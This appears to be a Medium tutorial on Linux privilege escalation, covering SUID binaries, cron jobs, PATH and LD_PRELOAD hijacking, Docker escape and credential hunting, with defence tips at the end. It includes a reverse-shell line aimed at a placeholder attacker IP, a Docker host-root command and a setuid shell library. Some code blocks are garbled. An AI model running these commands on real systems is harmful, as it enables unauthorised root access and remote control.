::: {}
# Linux Privilege Escalation: A Comprehensive Guide {#linux-privilege-escalation-a-comprehensive-guide .p-name}
:::

::: {.section .p-summary field="subtitle"}
Linux privilege escalation involves gaining elevated access to a Linux
system, often exploiting vulnerabilities, misconfigurations, or...
:::

::::::: {.section .e-content field="body"}
:::::: {#c815 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Linux Privilege Escalation: A Comprehensive Guide {#a619 .graf .graf--h3 .graf--leading .graf--title name="a619"}

<figure id="a6ca" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*yGAw0zYuHjzkBuGs.png"
class="graf-image" data-image-id="0*yGAw0zYuHjzkBuGs.png"
data-width="803" data-height="425" data-is-featured="true" />
</figure>

Linux privilege escalation involves gaining elevated access to a Linux
system, often exploiting vulnerabilities, misconfigurations, or other
flaws. This process is a critical part of ethical hacking and
penetration testing, as it allows security professionals to uncover
potential weaknesses before malicious actors exploit them. This guide
delves into common techniques, tools, and countermeasures for Linux
privilege escalation.

### 📘 1. Introduction {#cd4d .graf .graf--h3 .graf-after--p name="cd4d"}

Privilege escalation refers to obtaining higher permissions on a system
than initially granted. On Linux systems, these elevated privileges
often mean gaining root access, enabling attackers to execute commands,
access sensitive files, and compromise the entire system. Understanding
how privilege escalation works is essential for both attackers and
defenders.

Ethical hackers use privilege escalation techniques to:

- [Test system vulnerabilities.]{#e100}
- [Understand potential risks.]{#2488}
- [Implement mitigation strategies.]{#8549}

On the flip side, administrators and defenders must learn these methods
to protect their systems proactively.

### 🔍 2. Enumeration {#d82c .graf .graf--h3 .graf-after--p name="d82c"}

Enumeration is the first step in identifying potential escalation paths.
It involves collecting information about the system, such as:

- [Kernel version.]{#db06}
- [Running processes.]{#35a4}
- [Installed software and their versions.]{#bec3}
- [File permissions.]{#5f97}
- [User and group memberships.]{#3bce}

### Tools for Enumeration: {#9e39 .graf .graf--h3 .graf-after--li name="9e39"}

1.  [**LinPEAS**: A powerful script for automated privilege escalation
    enumeration.]{#88fa}
2.  [**Linux Exploit Suggester**: Identifies kernel vulnerabilities
    based on the system's kernel version.]{#daf3}
3.  [**ps**: Lists running processes.]{#913f}
4.  [**id**: Displays the current user's privileges.]{#61af}
5.  [**find**: Searches for files with specific attributes.]{#82d6}

**Example Command:**

``` {#b414 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
find / -perm -4000 2>/dev/null
```

This command finds all SUID binaries on the system.

### 🐧 3. Kernel Exploits {#9ed1 .graf .graf--h3 .graf-after--p name="9ed1"}

Outdated kernels can be vulnerable to privilege escalation exploits.
Attackers often search for publicly disclosed vulnerabilities that match
the kernel version.

### How It Works: {#7426 .graf .graf--h3 .graf-after--p name="7426"}

Determine the kernel version using:

- [`uname -r`{.markup--code .markup--li-code}]{#ef16}

Search for known vulnerabilities in exploit databases like
[Exploit-DB](https://www.exploit-db.com){.markup--anchor
.markup--p-anchor data-href="https://www.exploit-db.com" rel="noopener"
target="_blank"}.

Compile and execute the exploit.

**Example Vulnerabilities:**

- [Dirty Cow (CVE-2016--5195)]{#c7eb}
- [OverlayFS (CVE-2021--3493)]{#09f8}

### 🔓 4. SUID/GUID Binaries {#53d3 .graf .graf--h3 .graf-after--li name="53d3"}

SUID (Set-User-ID) and GUID (Set-Group-ID) binaries run with elevated
privileges. Misconfigured binaries can be exploited to gain root access.

### Identifying SUID/GUID Binaries: {#101f .graf .graf--h3 .graf-after--p name="101f"}

``` {#f61c .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
find / -perm -4000 2>/dev/null
```

### Example Exploit: {#e3f9 .graf .graf--h3 .graf-after--pre name="e3f9"}

If `/usr/bin/vulnerable_binary`{.markup--code .markup--p-code} is a SUID
binary:

``` {#ec60 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
/usr/bin/vulnerable_binary
```

Execute commands with elevated privileges.

### 📂 5. Weak File Permissions {#b266 .graf .graf--h3 .graf-after--p name="b266"}

Files with weak permissions, especially configuration files, can be
exploited. Attackers look for:

- [Writable `/etc/passwd`{.markup--code .markup--li-code} or
  `/etc/shadow`{.markup--code .markup--li-code} files.]{#1198}
- [Misconfigured SSH keys.]{#d9da}

**Example Command:**

``` {#15fe .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
ls -la /etc/passwd
```

If the file is writable, attackers can add a new user with root
privileges.

### ⚙️ 6. Misconfigured Services {#36fe .graf .graf--h3 .graf-after--p name="36fe"}

Services running with high privileges but without proper configuration
can be exploited.

### Examples: {#6bf8 .graf .graf--h3 .graf-after--p name="6bf8"}

- [MySQL: Exploiting user-defined functions (UDFs) to execute system
  commands.]{#2710}
- [Apache: Uploading malicious files to exploit vulnerabilities.]{#de8e}

**Exploitation Example:**

1.  [Find the service version:]{#64bb}

- [`service --status-all`{.markup--code .markup--li-code}]{#632b}

Search for known exploits.

### ⏰ 7. Exploiting Cron Jobs {#5422 .graf .graf--h3 .graf-after--p name="5422"}

Cron jobs automate tasks on Linux. Misconfigured cron jobs or writable
scripts can be leveraged for privilege escalation.

### How It Works: {#61b9 .graf .graf--h3 .graf-after--p name="61b9"}

1.  [List cron jobs:]{#0702}

- [`crontab -l cat /etc/crontab`{.markup--code .markup--li-code}]{#757b}

Modify writable scripts to include malicious commands.

**Example:** If a script runs as root:

``` {#eac7 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
echo "bash -i >& /dev/tcp/attacker_ip/1234 0>&1" >> /path/to/script.sh
```

### 🛠️ 8. PATH Variable Exploitation {#344b .graf .graf--h3 .graf-after--pre name="344b"}

The PATH environment variable determines where the system looks for
executables. If it is improperly configured, attackers can replace
binaries with malicious versions.

### Exploitation Example: {#c44d .graf .graf--h3 .graf-after--p name="c44d"}

Check the PATH variable:

echo \$PATH

``` {#fb6e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
2. Create a malicious binary in a writable directory included in PATH.
```bash
echo "#!/bin/bash
/bin/bash" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

Run the command to escalate privileges.

### 🔑 9. SSH Key Abuse {#e520 .graf .graf--h3 .graf-after--p name="e520"}

SSH keys provide secure access to systems, but misconfigured keys can be
exploited.

### Steps: {#af25 .graf .graf--h3 .graf-after--p name="af25"}

1.  [Locate SSH keys:]{#60c4}

- [`find / -name authorized_keys`{.markup--code
  .markup--li-code}]{#00ca}

Add your public key to `authorized_keys`{.markup--code .markup--p-code}
to gain access.

### 🌐 10. NFS (Network File System) Misconfigurations {#8075 .graf .graf--h3 .graf-after--p name="8075"}

NFS allows file sharing across systems. Improper configurations can be
exploited to gain root access.

### Example: {#af20 .graf .graf--h3 .graf-after--p name="af20"}

1.  [Identify exported directories:]{#1a61}

- [`showmount -e target_ip`{.markup--code .markup--li-code}]{#3bcf}

Mount the directory and manipulate files.

### 🔐 11. Password and Credentials Hunting {#06e3 .graf .graf--h3 .graf-after--p name="06e3"}

Sensitive information like passwords often resides in configuration
files, logs, or databases.

### Example Locations: {#abb9 .graf .graf--h3 .graf-after--p name="abb9"}

- [`/etc/passwd`{.markup--code .markup--li-code}]{#2c93}
- [`/etc/shadow`{.markup--code .markup--li-code}]{#b332}
- [`/var/log`{.markup--code .markup--li-code}]{#a2ad}

**Command:**

``` {#18c5 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="perl"}
grep -i "password" /var/log/*
```

### 🎛️ 12. Exploiting Capabilities {#cd55 .graf .graf--h3 .graf-after--pre name="cd55"}

Linux capabilities allow non-root users to perform specific privileged
tasks. Misconfigured capabilities can be exploited.

### Example: {#9c7e .graf .graf--h3 .graf-after--p name="9c7e"}

Check capabilities of binaries:

``` {#d955 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
getcap -r / 2>/dev/null
```

If a binary has `cap_setuid`{.markup--code .markup--p-code}, it can be
exploited.

### 🐳 13. Docker Privilege Escalation {#6347 .graf .graf--h3 .graf-after--p name="6347"}

Docker containers running with privileged flags can be exploited to
access the host system.

### Exploitation Steps: {#0bf4 .graf .graf--h3 .graf-after--p name="0bf4"}

Identify Docker containers:

docker ps -a

``` {#3c91 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
2. Gain a root shell on the host:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 📚 14. LD_PRELOAD and Library Hijacking {#e474 .graf .graf--h3 .graf-after--pre name="e474"}

The `LD_PRELOAD`{.markup--code .markup--p-code} environment variable can
load malicious libraries before legitimate ones.

### Exploitation Example: {#b790 .graf .graf--h3 .graf-after--p name="b790"}

1.  [Create a malicious library:]{#524b}

- [`#include <stdio.h> static void _init() { setuid(0); system("/bin/bash"); }`{.markup--code
  .markup--li-code}]{#a87f}

Compile and execute it:

gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles
LD_PRELOAD=./malicious.so /path/to/vulnerable_binary

--- -

### \## 🛡️ 15. Tips for Defense and Mitigation {#8efe .graf .graf--h3 .graf-after--p name="8efe"}

Preventing privilege escalation involves a combination of proactive
measures and continuous monitoring:

\### General Tips:\
1. Keep the system and software updated.\
2. Remove unnecessary SUID/GUID binaries.\
3. Regularly audit file and directory permissions.\
4. Use strong passwords and enable MFA.\
5. Restrict cron job permissions.\
6. Monitor and log all privileged actions.\
7. Use tools like AppArmor and SELinux for added security.

By understanding these techniques, both attackers and defenders can stay
ahead in the ever-evolving field of cybersecurity. Remember, ethical use
of this knowledge is crucial in maintaining a secure and trustworthy
digital environment.

### Promote and Collaborate on Cybersecurity Insights {#3239 .graf .graf--h3 .graf-after--p name="3239"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#23a8 .graf .graf--h3 .graf-after--p name="23a8"}

[Vijay
Gupta](https://www.youtube.com%2F@www.youtube.com/@bevijaygupta){.markup--anchor
.markup--p-anchor
data-href="https://www.youtube.com%2F@www.youtube.com/@bevijaygupta"
rel="noopener ugc nofollow noopener" target="_blank"} is a cybersecurity
enthusiast with several years of experience in cyber security, [cyber
crime forensics
investigation](https://www.amazon.com/dp/B0CW4L574N){.markup--anchor
.markup--p-anchor data-href="https://www.amazon.com/dp/B0CW4L574N"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [January 27, 2025](https://medium.com/p/856ec71566a9).

[Canonical
link](https://medium.com/@bevijaygupta/linux-privilege-escalation-a-comprehensive-guide-856ec71566a9){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
